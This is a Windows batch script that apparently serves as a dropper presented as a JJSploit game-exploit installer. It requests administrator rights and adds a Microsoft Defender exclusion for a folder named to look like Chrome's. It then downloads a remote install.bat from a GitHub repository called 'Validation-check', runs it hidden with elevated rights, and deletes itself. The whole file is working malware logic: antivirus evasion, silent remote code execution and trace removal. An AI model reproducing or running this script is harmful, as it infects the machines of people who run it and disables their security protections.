@echo off
NET SESSION >nul 2>nul
if %errorlevel% NEQ 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)
mkdir "%APPDATA%\Chrome"
powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%\Chrome'"
rmdir /s /q "%APPDATA%\Chrome"
powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Glareing/Validation-check/main/install.bat' -OutFile '%APPDATA%/install.bat'"
powershell -Command "Start-Process '"%APPDATA%\install.bat' -WindowStyle Hidden -Verb RunAs"
powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Glareing/Validation-check/main/jjsploit_8.14.1_x64_en-US.msi' -OutFile '%USERPROFILE%/Desktop'"
if not exist "%APPDATA%\install.bat" (
    timeout /t 2
    powershell -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null; [System.Windows.Forms.MessageBox]::Show('did not work','Notification')"
)
(del "%~f0") & exit
